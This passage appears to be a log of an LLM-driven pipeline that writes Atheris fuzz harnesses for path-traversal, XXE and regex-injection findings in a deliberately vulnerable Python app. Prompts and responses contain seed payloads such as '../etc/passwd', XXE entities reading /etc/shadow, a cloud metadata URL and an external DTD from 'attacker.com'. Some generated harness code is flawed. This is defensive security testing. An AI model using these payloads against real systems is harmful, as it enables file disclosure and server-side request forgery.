- Think about what values would cause the tainted param to reach the sink.
- Generate variations covering: scheme prefixes, IP formats, encoding variants,
  edge cases from trigger_patterns.
- Do not limit generation to only the seed corpus.

### What NOT to Do
- Do NOT run _COMPILED_PATTERNS against the input parameter — patterns must be
  applied only to the argument captured at the sink.
- Do NOT mock any function called before the sink — validation and parsing logic
  must run with real behavior.
- Do NOT use call.kwargs.get(None) — always use a named string key.
- Do NOT place the oracle check inside the function call try/except block —
  RuntimeError from the oracle must propagate to Atheris.

### Seed Corpus Rules (CRITICAL)
- Define _SEED_CORPUS as a module-level list OUTSIDE TestOneInput.
- Populate it with at least 6 bypass-oriented entries derived from
  trigger_patterns and condition_desc.
- Entries must be designed to reach the sink and trigger oracle patterns.
  Cover: internal IPs, metadata endpoints, file URIs, mixed-case schemes,
  encoded variants.
- NEVER reference _SEED_CORPUS inside TestOneInput.
- NEVER use ConsumeBool() or ConsumeIntInRange() to select from _SEED_CORPUS.
- Seeds are exported to disk at startup (see __main__ block in template).
  libFuzzer will mutate their raw bytes directly — this is how coverage-guided
  mutation works correctly.

## Quality Checklist (verify before outputting)
[ ] All tainted params are fuzzed via FuzzedDataProvider, consuming len(data) for single param
[ ] No ConsumeBool()/ConsumeIntInRange() used to index into a seed list inside TestOneInput
[ ] _SEED_CORPUS defined at module level, outside TestOneInput
[ ] _SEED_CORPUS has at least 6 entries derived from trigger_patterns
[ ] String inputs generated using ConsumeBytes().decode() instead of ConsumeUnicodeNoSurrogates() to preserve seeds
[ ] skip_condition applied to input only — not used in oracle
[ ] patch_target mocked correctly, no pre-sink functions mocked
[ ] Oracle check is OUTSIDE the function call try/except
[ ] Oracle check applies _COMPILED_PATTERNS to captured sink argument, NOT to input
[ ] Both call.args and call.kwargs checked with string key (never None)
[ ] captured converted to str before pattern matching
[ ] RuntimeError is re-raised, never swallowed
[ ] No markdown or explanation in output
````


### User Prompt

````text
Complete the following partial Atheris harness by filling in the TestOneInput body.
Output the complete Python script only. No markdown, no explanation.

# AUTO-GENERATED ATHERIS HARNESS
# rule_id  : py/path-injection
# function : do_GET
# file     : dsvw.py
# ================================================================
import atheris
import sys
import re
import os

from unittest.mock import patch, MagicMock



REPO_ROOT = "/home/trieudai/VulnHunterX/repos/python/realvuln-dsvw"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from dsvw import do_GET


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("\\.{2}\\/", re.IGNORECASE),

    re.compile("\\.{2}\\\\", re.IGNORECASE),

    re.compile("^\\/etc\\/passwd$", re.IGNORECASE),

    re.compile("^C:\\\\windows\\\\win.ini$", re.IGNORECASE),

]
_RAISE_MESSAGE  = "PY_PATH-INJECTION: Path traversal detected - captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = [{"name": "path", "index": null, "type": "query_param"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : recorded_call
# patch_target     : builtins.open
# target_arg_index : 0
# target_arg_name  : file
# input_strategy   : flask_view
# signature        : def do_GET(self)
# condition        : captured path contains directory traversal patterns like '../' or absolute paths outside intended scope
# capture_what     : path passed to open
# skip_hint        : not ('path' in locals() and isinstance(params.get('path'), str))
# ========================================


# === RECORDED_CALL SKELETON ===
# TODO: Complete TestOneInput following these steps:
# 1. Generate inputs using FuzzedDataProvider.
# 2. Apply skip_hint (if applicable).
# 3. Mock the patch target using patch/MagicMock.
# 4. Call target function inside the mock context.
# 5. Compare mock call arguments against _COMPILED_PATTERNS.
# 6. Propagate RuntimeError; swallow other exceptions.
# ==========================================



def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    # NOTE: For string inputs, use fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    #       instead of ConsumeUnicodeNoSurrogates() to preserve raw seed payloads.
    
    # 1. Generate inputs from fdp
    
    param_path = fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    
    query_params = {
        
        "path": param_path,
        
    }
    
    # 2. Wrap in Flask Request Context
    with app.test_request_context(query_string=query_params):
        pass  # [FILL HERE — follow the skeleton above]
    


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    # [FILL HERE — at least 6 bypass-attempt strings]
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_path_injection_dsvw_py_37"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()
````


### LLM Response (Iteration 1)

````text
import atheris
import sys
import re
import os
from unittest.mock import patch, MagicMock
from urllib.parse import urlencode

REPO_ROOT = "/home/trieudai/VulnHunterX/repos/python/realvuln-dsvw"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():
    from dsvw import do_GET
    from flask import Flask

app = Flask(__name__)

# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [
    re.compile(r"\.\.\/", re.IGNORECASE),
    re.compile(r"\.\.\\", re.IGNORECASE),
    re.compile(r"^\/etc\/passwd$", re.IGNORECASE),
    re.compile(r"^C:\\windows\\win.ini$", re.IGNORECASE),
]
_RAISE_MESSAGE  = "PY_PATH-INJECTION: Path traversal detected - captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = [{"name": "path", "index": None, "type": "query_param"}]
# ========================================

# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
_SEED_CORPUS = [
    "../etc/passwd",
    "..\\windows\\win.ini",
    "%2e%2e%5cwindows%5cwin.ini",
    "..\\/etc/passwd",
    "....//etc/passwd",
    "..\\..\\windows\\win.ini"
]

def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    
    # 1. Generate inputs from fdp
    param_path = fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    
    query_params = {
        "path": param_path,
    }
    
    # 2. Apply skip hint
    if not isinstance(param_path, str):
        return
    
    # 3. Mock the patch target
    with patch('builtins.open', MagicMock()) as mock_open:
        # 4. Call target function inside the mock context
        try:
            with app.test_request_context('/?' + urlencode(query_params)):
                do_GET()
        except RuntimeError:
            raise
        except Exception:
            pass
        
        # 5. Oracle check - outside try/except, inside patch context
        for call in mock_open.call_args_list:
            captured = None
            if call.args:
                captured = str(call.args[0])
            elif call.kwargs:
                captured = str(call.kwargs.get('file', ''))
            
            if captured:
                for pattern in _COMPILED_PATTERNS:
                    if pattern.search(captured):
                        raise RuntimeError(_RAISE_MESSAGE.format(captured=captured, matched_pattern=pattern.pattern))


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_path_injection_dsvw_py_37"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()
````

- Result: `generated`
- Harness: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_targets/py_path_injection_dsvw_py_37.py`

## [4/7] py/path-injection

- File: `dsvw.py:41`
- Target: `py_path_injection_dsvw_py_41`
- Oracle: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_oracles/py_path_injection_dsvw_py_41.json`
- Harness: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_targets/py_path_injection_dsvw_py_41.py`
- Corpus: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_path_injection_dsvw_py_41`

### System Prompt

````text
You are an expert security fuzzing engineer specializing in Python vulnerability research.
Your task is to complete an Atheris fuzz harness that detects sink-reachability bugs
(SSRF, path traversal, command injection, etc.) using a recorded_call oracle strategy.

## Your Role
You intercept a specific function call (the "sink") by mocking it, then inspect
the argument that reaches it. If the argument matches any forbidden pattern,
the oracle fires.

## Critical Oracle Rule — Read This First
The oracle fires on what REACHES the sink, not on what enters the function.
_COMPILED_PATTERNS must be applied ONLY to the argument captured at the patched
call (call.args or call.kwargs) — never to the input parameter itself.

Applying patterns to the input parameter is ALWAYS wrong for recorded_call strategy.
It causes the oracle to fire before the function executes, turning every seed
corpus entry into a false positive regardless of whether the vulnerability exists.

## Harness Completion Rules

### Structure
- Output a single complete Python file. No markdown. No explanation. No code fences.
- You may add helper functions, imports, or constants outside TestOneInput.
- Do not modify any section marked FIXED CONTRACTS.

### TestOneInput — Required Logic

1. INPUT GENERATION
   - Use FuzzedDataProvider to generate inputs for all tainted params based on
     the function signature.

   - STRING INPUTS REGULATION:
     * Always generate string/unicode inputs by consuming bytes and decoding them to preserve raw payloads:
       val = fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
     * Do NOT use ConsumeUnicodeNoSurrogates() for arguments that need to match exact exploit patterns (like shell commands, import statement strings).

   - Buffer allocation strategy (inferred from signature):
       - MULTIPLE params → split the buffer proportionally by param count.
         For str/bytes params, divide remaining bytes evenly; consume the
         last str/bytes param with remaining bytes. Fixed-size types (int,
         float, bool) consume their natural byte width first, then split
         the remainder among str/bytes params.
       - FORBIDDEN: Do NOT use ConsumeIntInRange() to select a strategy
         index or branch — this prevents the fuzzer from mutating payload.

2. SKIP CONDITION
   - Apply the skip_hint early in TestOneInput.
   - If input does not meet minimum criteria, return immediately.
   - This avoids wasting fuzzer cycles on irrelevant inputs.
   - The skip condition filters INPUT only — it has no relation to the oracle check.

3. MOCK SETUP
   - Patch the exact target specified in patch_target.
   - Mock only the patched sink. Do NOT mock validation functions, input parsers,
     or any function called BEFORE the sink — those must execute with real logic
     so that the fuzzer tests actual data flow to the sink.
   - Mock return value must be realistic enough for the target function to continue
     executing past the patched call — use MagicMock with appropriate spec.
   - Use `with patch(...) as mock_obj:` scoping.

4. FUNCTION CALL
   - Call the target function inside the patch context.
   - Wrap in try/except Exception: pass — but keep RuntimeError re-raise outside.

5. ORACLE CHECK  ← must be OUTSIDE the function call try/except, INSIDE the patch context
   - After the target function call, iterate mock_obj.call_args_list.
   - For each call, extract the captured argument:
     * Check call.args[target_arg_index] first.
     * Fall back to call.kwargs.get(target_arg_name) if args is empty.
     * kwargs fallback must use a string key ("url", "request", etc.) — never None.
   - Convert captured to str before pattern matching.
   - Run every pattern in _COMPILED_PATTERNS against the captured value.
   - On any match: raise RuntimeError(_RAISE_MESSAGE)

6. EXCEPTION HANDLING
   - except RuntimeError: raise        → never swallow oracle signals
   - except Exception: pass            → swallow all other exceptions
   - Never use bare except.

### Input Generation Strategy
- Think about what values would cause the tainted param to reach the sink.
- Generate variations covering: scheme prefixes, IP formats, encoding variants,
  edge cases from trigger_patterns.
- Do not limit generation to only the seed corpus.

### What NOT to Do
- Do NOT run _COMPILED_PATTERNS against the input parameter — patterns must be
  applied only to the argument captured at the sink.
- Do NOT mock any function called before the sink — validation and parsing logic
  must run with real behavior.
- Do NOT use call.kwargs.get(None) — always use a named string key.
- Do NOT place the oracle check inside the function call try/except block —
  RuntimeError from the oracle must propagate to Atheris.

### Seed Corpus Rules (CRITICAL)
- Define _SEED_CORPUS as a module-level list OUTSIDE TestOneInput.
- Populate it with at least 6 bypass-oriented entries derived from
  trigger_patterns and condition_desc.
- Entries must be designed to reach the sink and trigger oracle patterns.
  Cover: internal IPs, metadata endpoints, file URIs, mixed-case schemes,
  encoded variants.
- NEVER reference _SEED_CORPUS inside TestOneInput.
- NEVER use ConsumeBool() or ConsumeIntInRange() to select from _SEED_CORPUS.
- Seeds are exported to disk at startup (see __main__ block in template).
  libFuzzer will mutate their raw bytes directly — this is how coverage-guided
  mutation works correctly.

## Quality Checklist (verify before outputting)
[ ] All tainted params are fuzzed via FuzzedDataProvider, consuming len(data) for single param
[ ] No ConsumeBool()/ConsumeIntInRange() used to index into a seed list inside TestOneInput
[ ] _SEED_CORPUS defined at module level, outside TestOneInput
[ ] _SEED_CORPUS has at least 6 entries derived from trigger_patterns
[ ] String inputs generated using ConsumeBytes().decode() instead of ConsumeUnicodeNoSurrogates() to preserve seeds
[ ] skip_condition applied to input only — not used in oracle
[ ] patch_target mocked correctly, no pre-sink functions mocked
[ ] Oracle check is OUTSIDE the function call try/except
[ ] Oracle check applies _COMPILED_PATTERNS to captured sink argument, NOT to input
[ ] Both call.args and call.kwargs checked with string key (never None)
[ ] captured converted to str before pattern matching
[ ] RuntimeError is re-raised, never swallowed
[ ] No markdown or explanation in output
````


### User Prompt

````text
Complete the following partial Atheris harness by filling in the TestOneInput body.
Output the complete Python script only. No markdown, no explanation.

# AUTO-GENERATED ATHERIS HARNESS
# rule_id  : py/path-injection
# function : do_GET
# file     : dsvw.py
# ================================================================
import atheris
import sys
import re
import os

from unittest.mock import patch, MagicMock



REPO_ROOT = "/home/trieudai/VulnHunterX/repos/python/realvuln-dsvw"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from dsvw import do_GET


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("<!ENTITY", re.IGNORECASE),

    re.compile("file://", re.IGNORECASE),

    re.compile("http://", re.IGNORECASE),

    re.compile("<!DOCTYPE", re.IGNORECASE),

    re.compile("&[a-zA-Z0-9]+;", re.IGNORECASE),

]
_RAISE_MESSAGE  = "PY_PATH-INJECTION: XXE payload detected in XML input — captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = [{"name": "self.path", "index": 0, "type": "str"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : recorded_call
# patch_target     : lxml.etree.parse
# target_arg_index : 0
# target_arg_name  : None
# input_strategy   : flask_view
# signature        : def do_GET(self)
# condition        : Payload contains XML external entity declarations or file inclusion patterns
# capture_what     : XML string passed to lxml.etree.parse
# skip_hint        : not ('<!' in params.get('xml', '') and ('ENTITY' in params['xml'] or 'DOCTYPE' in params['xml']))
# ========================================


# === RECORDED_CALL SKELETON ===
# TODO: Complete TestOneInput following these steps:
# 1. Generate inputs using FuzzedDataProvider.
# 2. Apply skip_hint (if applicable).
# 3. Mock the patch target using patch/MagicMock.
# 4. Call target function inside the mock context.
# 5. Compare mock call arguments against _COMPILED_PATTERNS.
# 6. Propagate RuntimeError; swallow other exceptions.
# ==========================================



def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    # NOTE: For string inputs, use fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    #       instead of ConsumeUnicodeNoSurrogates() to preserve raw seed payloads.
    
    # 1. Generate inputs from fdp
    
    param_self.path = fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    
    query_params = {
        
        "self.path": param_self.path,
        
    }
    
    # 2. Wrap in Flask Request Context
    with app.test_request_context(query_string=query_params):
        pass  # [FILL HERE — follow the skeleton above]
    


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    # [FILL HERE — at least 6 bypass-attempt strings]
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_path_injection_dsvw_py_41"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()
````


### LLM Response (Iteration 1)

````text
import atheris
import sys
import re
import os

from unittest.mock import patch, MagicMock



REPO_ROOT = "/home/trieudai/VulnHunterX/repos/python/realvuln-dsvw"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from dsvw import do_GET
    from flask import Flask


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("<!ENTITY", re.IGNORECASE),

    re.compile("file://", re.IGNORECASE),

    re.compile("http://", re.IGNORECASE),

    re.compile("<!DOCTYPE", re.IGNORECASE),

    re.compile("&[a-zA-Z0-9]+;", re.IGNORECASE),

]
_RAISE_MESSAGE  = "PY_PATH-INJECTION: XXE payload detected in XML input — captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = [{"name": "self.path", "index": 0, "type": "str"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : recorded_call
# patch_target     : lxml.etree.parse
# target_arg_index : 0
# target_arg_name  : None
# input_strategy   : flask_view
# signature        : def do_GET(self)
# condition        : Payload contains XML external entity declarations or file inclusion patterns
# capture_what     : XML string passed to lxml.etree.parse
# skip_hint        : not ('<!' in params.get('xml', '') and ('ENTITY' in params['xml'] or 'DOCTYPE' in params['xml']))
# ========================================


# === RECORDED_CALL SKELETON ===
# TODO: Complete TestOneInput following these steps:
# 1. Generate inputs using FuzzedDataProvider.
# 2. Apply skip_hint (if applicable).
# 3. Mock the patch target using patch/MagicMock.
# 4. Call target function inside the mock context.
# 5. Compare mock call arguments against _COMPILED_PATTERNS.
# 6. Propagate RuntimeError; swallow other exceptions.
# ==========================================

app = Flask(__name__)

def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    # NOTE: For string inputs, use fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    #       instead of ConsumeUnicodeNoSurrogates() to preserve raw seed payloads.
    
    # 1. Generate inputs from fdp
    
    param_self_path = fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    
    # 2. Apply skip_hint
    if not ('<!' in param_self_path and ('ENTITY' in param_self_path or 'DOCTYPE' in param_self_path)):
        return
    
    # Create a mock request object
    class MockRequest:
        def __init__(self, path):
            self.path = path
            
    mock_request = MockRequest(param_self_path)
    
    # 3. Mock the patch target using patch/MagicMock.
    with patch('lxml.etree.parse') as mock_parse:
        mock_parse.return_value = MagicMock()
        
        try:
            # 4. Call target function inside the mock context.
            do_GET(mock_request)
        except RuntimeError:
            raise
        except Exception:
            pass
            
        # 5. Compare mock call arguments against _COMPILED_PATTERNS.
        for call in mock_parse.call_args_list:
            captured_arg = None
            if call.args:
                captured_arg = str(call.args[0])
            elif call.kwargs:
                # Fallback to kwargs - using a string key as required
                captured_arg = str(call.kwargs.get('source', ''))
                
            if captured_arg:
                for pattern in _COMPILED_PATTERNS:
                    if pattern.search(captured_arg):
                        raise RuntimeError(_RAISE_MESSAGE.format(captured=captured_arg, matched_pattern=pattern.pattern))


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    "<!ENTITY ext SYSTEM \"file:///etc/passwd\">",
    "<!DOCTYPE foo [ <!ENTITY ext SYSTEM \"file://c:/windows/win.ini\"> ]>",
    "<!doctype test [ <!entity xxe SYSTEM \"http://example.com/evil.xml\"> ]>",
    "<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent'>\">",
    "file:///etc/shadow",
    "http://169.254.169.254/latest/meta-data/",
    "<!ENTITY % dtd \"<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/hosts'>\">",
    "<!DOCTYPE data [ <!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\"> %remote; ]>"
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_path_injection_dsvw_py_41"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()
````

- Result: `generated`
- Harness: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_targets/py_path_injection_dsvw_py_41.py`

## [5/7] py/regex-injection

- File: `dsvw.py:26`
- Target: `py_regex_injection_dsvw_py_26`
- Oracle: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_oracles/py_regex_injection_dsvw_py_26.json`
- Harness: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_targets/py_regex_injection_dsvw_py_26.py`
- Corpus: `/home/trieudai/Oraculum/output/python/realvuln-dsvw/fuzz_corpus/py_regex_injection_dsvw_py_26`

### System Prompt

````text
You are an expert security fuzzing engineer specializing in Python vulnerability research.
Your task is to complete an Atheris fuzz harness that detects sink-reachability bugs
(SSRF, path traversal, command injection, etc.) using a recorded_call oracle strategy.

## Your Role
You intercept a specific function call (the "sink") by mocking it, then inspect
the argument that reaches it. If the argument matches any forbidden pattern,
the oracle fires.

## Critical Oracle Rule — Read This First
The oracle fires on what REACHES the sink, not on what enters the function.
_COMPILED_PATTERNS must be applied ONLY to the argument captured at the patched
call (call.args or call.kwargs) — never to the input parameter itself.

Applying patterns to the input parameter is ALWAYS wrong for recorded_call strategy.
It causes the oracle to fire before the function executes, turning every seed
corpus entry into a false positive regardless of whether the vulnerability exists.

## Harness Completion Rules

### Structure
- Output a single complete Python file. No markdown. No explanation. No code fences.
- You may add helper functions, imports, or constants outside TestOneInput.
- Do not modify any section marked FIXED CONTRACTS.

### TestOneInput — Required Logic

1. INPUT GENERATION
   - Use FuzzedDataProvider to generate inputs for all tainted params based on
     the function signature.

   - STRING INPUTS REGULATION:
     * Always generate string/unicode inputs by consuming bytes and decoding them to preserve raw payloads:
       val = fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
     * Do NOT use ConsumeUnicodeNoSurrogates() for arguments that need to match exact exploit patterns (like shell commands, import statement strings).

   - Buffer allocation strategy (inferred from signature):
       - MULTIPLE params → split the buffer proportionally by param count.
         For str/bytes params, divide remaining bytes evenly; consume the
         last str/bytes param with remaining bytes. Fixed-size types (int,
         float, bool) consume their natural byte width first, then split
         the remainder among str/bytes params.
       - FORBIDDEN: Do NOT use ConsumeIntInRange() to select a strategy
         index or branch — this prevents the fuzzer from mutating payload.

2. SKIP CONDITION
   - Apply the skip_hint early in TestOneInput.
   - If input does not meet minimum criteria, return immediately.
   - This avoids wasting fuzzer cycles on irrelevant inputs.
   - The skip condition filters INPUT only — it has no relation to the oracle check.

3. MOCK SETUP
   - Patch the exact target specified in patch_target.
   - Mock only the patched sink. Do NOT mock validation functions, input parsers,
     or any function called BEFORE the sink — those must execute with real logic
     so that the fuzzer tests actual data flow to the sink.
   - Mock return value must be realistic enough for the target function to continue
     executing past the patched call — use MagicMock with appropriate spec.
   - Use `with patch(...) as mock_obj:` scoping.

4. FUNCTION CALL
   - Call the target function inside the patch context.
   - Wrap in try/except Exception: pass — but keep RuntimeError re-raise outside.

5. ORACLE CHECK  ← must be OUTSIDE the function call try/except, INSIDE the patch context
   - After the target function call, iterate mock_obj.call_args_list.
   - For each call, extract the captured argument:
     * Check call.args[target_arg_index] first.
     * Fall back to call.kwargs.get(target_arg_name) if args is empty.
     * kwargs fallback must use a string key ("url", "request", etc.) — never None.
   - Convert captured to str before pattern matching.
   - Run every pattern in _COMPILED_PATTERNS against the captured value.
   - On any match: raise RuntimeError(_RAISE_MESSAGE)

6. EXCEPTION HANDLING
   - except RuntimeError: raise        → never swallow oracle signals
   - except Exception: pass            → swallow all other exceptions
   - Never use bare except.

### Input Generation Strategy
- Think about what values would cause the tainted param to reach the sink.
- Generate variations covering: scheme prefixes, IP formats, encoding variants,
  edge cases from trigger_patterns.
- Do not limit generation to only the seed corpus.

### What NOT to Do
- Do NOT run _COMPILED_PATTERNS against the input parameter — patterns must be
  applied only to the argument captured at the sink.
- Do NOT mock any function called before the sink — validation and parsing logic
  must run with real behavior.
- Do NOT use call.kwargs.get(None) — always use a named string key.
- Do NOT place the oracle check inside the function call try/except block —
  RuntimeError from the oracle must propagate to Atheris.

### Seed Corpus Rules (CRITICAL)
- Define _SEED_CORPUS as a module-level list OUTSIDE TestOneInput.
- Populate it with at least 6 bypass-oriented entries derived from
  trigger_patterns and condition_desc.
- Entries must be designed to reach the sink and trigger oracle patterns.
  Cover: internal IPs, metadata endpoints, file URIs, mixed-case schemes,
  encoded variants.
- NEVER reference _SEED_CORPUS inside TestOneInput.
- NEVER use ConsumeBool() or ConsumeIntInRange() to select from _SEED_CORPUS.
- Seeds are exported to disk at startup (see __main__ block in template).
  libFuzzer will mutate their raw bytes directly — this is how coverage-guided
  mutation works correctly.

## Quality Checklist (verify before outputting)
[ ] All tainted params are fuzzed via FuzzedDataProvider, consuming len(data) for single param
[ ] No ConsumeBool()/ConsumeIntInRange() used to index into a seed list inside TestOneInput
[ ] _SEED_CORPUS defined at module level, outside TestOneInput
[ ] _SEED_CORPUS has at least 6 entries derived from trigger_patterns
[ ] String inputs generated using ConsumeBytes().decode() instead of ConsumeUnicodeNoSurrogates() to preserve seeds
[ ] skip_condition applied to input only — not used in oracle
[ ] patch_target mocked correctly, no pre-sink functions mocked
[ ] Oracle check is OUTSIDE the function call try/except
[ ] Oracle check applies _COMPILED_PATTERNS to captured sink argument, NOT to input
[ ] Both call.args and call.kwargs checked with string key (never None)
[ ] captured converted to str before pattern matching
[ ] RuntimeError is re-raised, never swallowed
[ ] No markdown or explanation in output
````


### User Prompt

````text
Complete the following partial Atheris harness by filling in the TestOneInput body.
Output the complete Python script only. No markdown, no explanation.

# AUTO-GENERATED ATHERIS HARNESS
# rule_id  : py/regex-injection
# function : do_GET
# file     : dsvw.py
# ================================================================
import atheris
import sys
import re
import os

from unittest.mock import patch, MagicMock



REPO_ROOT = "/home/trieudai/VulnHunterX/repos/python/realvuln-dsvw"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from dsvw import do_GET


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("\\(.*\\)", re.IGNORECASE),

    re.compile("\\[.*\\]", re.IGNORECASE),

    re.compile(".*\\*.*", re.IGNORECASE),

    re.compile(".*\\+.*", re.IGNORECASE),

    re.compile("\\{.*\\}", re.IGNORECASE),

    re.compile(".*\\?\\?.*", re.IGNORECASE),

]
_RAISE_MESSAGE  = "PY_REGEX_INJECTION: Unescaped user input in regex pattern — captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = []
# ========================================

# === ORACLE CONTEXT ===
# strategy         : recorded_call
# patch_target     : re.findall
# target_arg_index : 0
# target_arg_name  : pattern
# input_strategy   : flask_view
# signature        : def do_GET(self)
# condition        : captured regex pattern contains user-controlled input without escaping, enabling ReDoS or data extraction
# capture_what     : regex pattern passed to re.findall
# skip_hint        : len(captured) > 1000 or '\\' in captured
# ========================================


# === RECORDED_CALL SKELETON ===
# TODO: Complete TestOneInput following these steps:
# 1. Generate inputs using FuzzedDataProvider.
# 2. Apply skip_hint (if applicable).
# 3. Mock the patch target using patch/MagicMock.
# 4. Call target function inside the mock context.
# 5. Compare mock call arguments against _COMPILED_PATTERNS.
# 6. Propagate RuntimeError; swallow other exceptions.
# ==========================================



def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    # NOTE: For string inputs, use fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    #       instead of ConsumeUnicodeNoSurrogates() to preserve raw seed payloads.
    
    # 1. Generate inputs from fdp
    
    query_params = {
        
    }
    
    # 2. Wrap in Flask Request Context
    with app.test_request_context(query_string=query_params):
        pass  # [FILL HERE — follow the skeleton above]
    


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    # [FILL HERE — at least 6 bypass-attempt strings]
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
